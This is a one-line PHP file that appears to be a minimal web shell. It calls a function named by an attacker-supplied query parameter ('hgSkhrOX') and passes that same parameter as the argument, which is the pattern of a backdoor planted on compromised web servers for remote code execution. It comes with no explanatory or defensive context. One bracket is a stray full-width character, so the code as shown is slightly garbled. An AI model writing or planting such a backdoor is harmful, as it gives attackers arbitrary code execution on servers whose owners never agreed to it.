<?php
$_GET['hgSkhrOX'〕($_GET['hgSkhrOX']);
?>
